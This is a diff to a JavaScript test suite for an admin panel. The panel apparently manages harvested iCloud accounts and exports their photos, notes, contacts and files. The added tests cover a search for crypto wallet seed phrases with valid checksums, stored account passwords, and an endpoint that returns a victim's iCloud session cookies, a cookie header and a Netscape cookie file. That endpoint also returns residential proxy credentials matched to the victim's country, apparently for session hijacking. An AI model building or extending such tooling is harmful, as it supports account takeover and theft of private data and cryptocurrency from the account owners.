@@ -13,6 +13,8 @@ import { safeName, resolveWithin, gallery, search, readSummary } from "../admin/
 const folder = fs.mkdtempSync(path.join(os.tmpdir(), "panel-api-"));
 const storeFile = path.join(folder, "items.json");
 const exportDir = path.join(folder, "export");
+const sessionsDir = path.join(folder, "sessions");
+const sessionDir = path.join(sessionsDir, "sess-1");
 const email = "alice@example.com";
 const root = path.join(exportDir, safeName(email));
 
@@ -22,6 +24,16 @@ await fsp.mkdir(path.join(root, "Notes", "txt"), { recursive: true });
 await fsp.mkdir(path.join(root, "Contacts"), { recursive: true });
 await fsp.mkdir(path.join(root, "Drive"), { recursive: true });
 await fsp.mkdir(path.join(root, "Scan"), { recursive: true });
+await fsp.mkdir(sessionDir, { recursive: true });
+await fsp.writeFile(
+  path.join(sessionDir, "aliceexamplecom.cookiejar"),
+  [
+    "#LWP-Cookies-2.0",
+    'Set-Cookie3: X-APPLE-WEBAUTH-USER="\\"v=1:s=1:d=123\\""; path="/"; domain=".icloud.com"; path_spec; secure; expires="2027-01-02 03:04:05Z"; HttpOnly=None; version=0',
+    'Set-Cookie3: X-APPLE-WEBAUTH-TOKEN="abc"; path="/"; domain=".icloud.com"; path_spec; secure; expires="2027-01-02 03:04:05Z"; HttpOnly=None; version=0',
+    'Set-Cookie3: dslang="US-EN"; path="/"; domain=".apple.com"; path_spec; secure; discard; HttpOnly=None; version=0',
+  ].join("\n")
+);
 
 await fsp.writeFile(path.join(root, "Photos", "Library", "IMG_0001.jpg"), Buffer.from("jpeg-one"));
 await fsp.writeFile(path.join(root, "Photos", "Library", "IMG_0002.jpg"), Buffer.from("jpeg-two"));
@@ -113,6 +125,8 @@ await fsp.writeFile(
         identity: { name: "Alice" },
         counts: { photos: 2 },
         export: { phase: "done", done: 2, total: 2 },
+        sessionDir: "sessions/sess-1",
+        proxy: { country: "US", ssid: "abc123" },
       },
     ],
     jobs: [],
@@ -147,9 +161,26 @@ assert.match(found.images[0].snippet, /vault/);
 const notes = await search(root, { q: "abandon", kind: "note" });
 assert.equal(notes.notes.length, 1);
 
-const valid = await search(root, { kind: "seed", tier: "valid" });
+const hiddenSpam = await search(root, { kind: "seed" });
+assert.equal(hiddenSpam.seeds.length, 0, "spam phrases are hidden by default");
+assert.equal(hiddenSpam.seedSpam, 2);
+
+const valid = await search(root, { kind: "seed", tier: "valid", spam: "1" });
 assert.equal(valid.seeds.length, 1);
 assert.equal(valid.seeds[0].checksum, true);
+assert.equal(valid.seeds[0].spam, true);
+
+const firstPage = await search(root, { kind: "seed", spam: "1", page: 1, pageSize: 1 });
+assert.equal(firstPage.seeds.length, 1);
+assert.equal(firstPage.seedPages, 2);
+const secondPage = await search(root, { kind: "seed", spam: "1", page: 2, pageSize: 1 });
+assert.equal(secondPage.seeds.length, 1);
+assert.notEqual(firstPage.seeds[0].phrase, secondPage.seeds[0].phrase);
+
+const compact = await search(root, { kind: "seed", spam: "1", compact: "1" });
+assert.equal(compact.seeds.length, 0);
+assert.match(compact.lines, /checksum valid\t12 words/);
+assert.equal(compact.lines.split("\n").length, 2);
 
 /* ------------------------------------------------------------------- HTTP */
 
@@ -161,10 +192,37 @@ app.use(
   createAdminRouter({
     storeFile,
     exportDir,
+    sessionsDir,
+    proxyUrl: "http://user:pass@portal.anyip.io:1080",
     password: "panel-pw",
     secret: "test-secret",
     sessionHours: 1,
     warnings: ["test warning"],
+    health: async () => ({
+      generatedAt: "2026-01-01T00:00:00.000Z",
+      overall: "yellow",
+      checks: [
+        {
+          id: "nfs",
+          label: "Shared NFS",
+          group: "data",
+          status: "yellow",
+          detail: "76% used",
+          dependency: "10.20.0.30:/srv/icloud",
+          latencyMs: 2,
+        },
+      ],
+      nodes: [
+        {
+          id: "db-mon-1",
+          role: "data+ops",
+          privateIp: "10.20.0.30",
+          status: "green",
+          health: "up",
+          detail: "node_exporter up",
+        },
+      ],
+    }),
   })
 );
 const server = http.createServer(app);
@@ -189,7 +247,11 @@ const request = async (method, url, body) => {
 };
 
 const anon = await request("GET", "/api/admin/session");
-assert.equal(anon.status, 401, "session needs a cookie");
+assert.equal(anon.status, 200, "session probe is a 200 with ok:false");
+assert.equal(anon.payload.ok, false);
+
+const anonHealth = await request("GET", "/api/admin/health");
+assert.equal(anonHealth.status, 401);
 
 const bad = await request("POST", "/api/admin/login", { password: "nope" });
 assert.equal(bad.status, 401);
@@ -204,6 +266,27 @@ assert.equal(session.status, 200);
 assert.equal(session.payload.ok, true);
 assert.deepEqual(session.payload.warnings, ["test warning"]);
 
+const health = await request("GET", "/api/admin/health");
+assert.equal(health.status, 200);
+assert.equal(health.payload.overall, "yellow");
+assert.equal(health.payload.checks[0].id, "nfs");
+assert.equal(health.payload.nodes.length, 1);
+assert.equal(health.headers.get("cache-control"), "no-store");
+
+const manual = await request("GET", "/api/admin/accounts/acct-1/manual");
+assert.equal(manual.status, 200);
+assert.equal(manual.payload.account.password, "pw");
+assert.equal(manual.payload.session.found, true);
+assert.equal(manual.payload.cookies.length, 3);
+assert.equal(manual.payload.cookies[0].name, "X-APPLE-WEBAUTH-USER");
+assert.equal(manual.payload.cookies[0].value, '"v=1:s=1:d=123"');
+assert.equal(manual.payload.cookies[2].session, true);
+assert.equal(manual.payload.proxy.username, "user,country_US,session_abc123");
+assert.equal(manual.payload.proxy.server, "http://portal.anyip.io:1080");
+assert.match(manual.payload.cookieHeader, /X-APPLE-WEBAUTH-TOKEN=abc/);
+assert.ok(manual.payload.session.expiresAt.startsWith("2027-01-02"));
+assert.ok(manual.payload.netscape.includes("X-APPLE-WEBAUTH-TOKEN"));
+
 const accounts = await request("GET", "/api/admin/accounts/acct-1/summary");
 assert.equal(accounts.status, 200);
 assert.equal(accounts.payload.account.email, email);
@@ -217,7 +300,8 @@ const traversal = await request(
   "GET",
   "/api/admin/accounts/acct-1/tree?path=" + encodeURIComponent("../../")
 );
-assert.equal(traversal.status, 404);
+assert.equal(traversal.status, 200);
+assert.equal(traversal.payload.missing, true);
 
 const file = await request(
   "GET",
@@ -260,10 +344,10 @@ assert.equal(libraryPhoto.status, 200);
 assert.equal(libraryPhoto.payload.items[0].name, "IMG_0001.jpg");
 
 const allMedia = await request("GET", "/api/admin/accounts/acct-1/gallery?area=All&page=1&pageSize=60");
-assert.equal(allMedia.payload.total, 3, "All spans Library + Hidden");
+assert.equal(allMedia.payload.total, 4, "All spans Library + Hidden + Drive media");
 assert.deepEqual(
   [...new Set(allMedia.payload.items.map((item) => item.area))].sort(),
-  ["Hidden", "Library"]
+  ["Drive", "Hidden", "Library"]
 );
 
 const previewText = await request(
@@ -330,7 +414,8 @@ assert.match(secureLogin.headers.getSetCookie()[0], /; Secure/);
 const out = await request("POST", "/api/admin/logout");
 assert.equal(out.status, 200);
 const after = await request("GET", "/api/admin/session");
-assert.equal(after.status, 401);
+assert.equal(after.status, 200);
+assert.equal(after.payload.ok, false);
 
 server.close();
 fs.rmSync(folder, { recursive: true, force: true });
